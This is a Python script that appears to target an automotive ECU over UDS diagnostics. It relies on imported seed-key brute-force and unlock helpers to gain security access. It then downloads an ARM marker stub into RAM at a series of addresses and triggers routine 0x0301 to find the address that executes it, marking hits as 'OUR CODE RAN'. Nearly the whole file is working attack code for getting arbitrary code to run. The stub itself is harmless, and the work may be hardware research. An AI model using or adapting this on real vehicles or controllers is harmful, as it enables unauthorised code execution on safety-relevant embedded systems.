#!/usr/bin/env python3
"""0x0301 takes a 4-byte address and rejected the RAM base. Find the address it
accepts by loading our marker stub at each candidate and firing 0x31 01 0301 <addr>.
If 0x0301 is 'jump to address', the accepted one runs our stub -> 0xA5 in the reply
or a reboot. All targets here are RAM (safe).

  python ram_launch_probe.py [COMx]
"""
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "esp32"))
from isotp_uds import UdsClient
from seedkey_brute import wake, establish
from unlock_and_read import unlock

STUB = bytes([0xE3,0xA0,0x00,0xA5, 0xE1,0x2F,0xFF,0x1E])   # MOV R0,#0xA5 ; BX LR

def hx(r): return r.hex(' ').upper() if r else "(no response)"

def download(c, addr, data):
    sz=len(data)
    r=c.request([0x34,0x00,0x44,(addr>>24)&0xFF,(addr>>16)&0xFF,(addr>>8)&0xFF,addr&0xFF,
                 (sz>>24)&0xFF,(sz>>16)&0xFF,(sz>>8)&0xFF,sz&0xFF], timeout=1.0)
    if not r or r[0]!=0x74: return (False, r)
    tr=c.request([0x36,0x01]+list(data), timeout=1.5)
    if not tr or tr[0]!=0x76: return (False, tr)
    ex=c.request([0x37], timeout=1.0)
    return (bool(ex and ex[0]==0x77), ex)

def ensure(c):
    for _ in range(3):
        if establish(c):
            ok,_=unlock(c)
            if ok: return True
        wake(c,25)
    return False

def main():
    port=sys.argv[1] if len(sys.argv)>1 else "COM10"
    c=UdsClient(port,0x727,0x72F)
    if not wake(c): print("no wake; power-cycle during probe."); c.close(); return
    if not ensure(c): print("no session"); c.close(); return
    print("ready\n")
    addrs=[0x00400000,0x00400004,0x00400008,0x00400010,0x00400020,0x00400040,0x00400080,
           0x00400100,0x00400200,0x00400400,0x00400800,0x00401000,0x00402000,0x00403000,
           0x00403F00,0x00403FF8]
    for a in addrs:
        if not ensure(c):
            if not wake(c,30) or not ensure(c): print("cannot recover; stop"); break
        okd,dr = download(c, a, STUB)
        if not okd:
            print(f"  {a:08X}: download rejected ({hx(dr)})"); continue
        req=[0x31,0x01,0x03,0x01,(a>>24)&0xFF,(a>>16)&0xFF,(a>>8)&0xFF,a&0xFF]
        r=c.request(req, timeout=1.2)
        if r is None: r=c.request(req, timeout=1.2)
        if r is None: note="  <== NO RESPONSE (REBOOT - our code may have run!)"
        elif 0xA5 in r: note="  <== A5 *** OUR CODE RAN ***"
        elif r[0]==0x71: note="  <== POSITIVE (executed)"
        elif r[0]==0x7F and len(r)>=3: note=f"  (NRC {r[2]:02X})"
        else: note=""
        print(f"  0301 @ {a:08X} -> {hx(r)}{note}")
        if r is None or 0xA5 in (r or b""):
            print("  >>> stopping on hit"); break
    c.close()

if __name__ == "__main__":
    main()
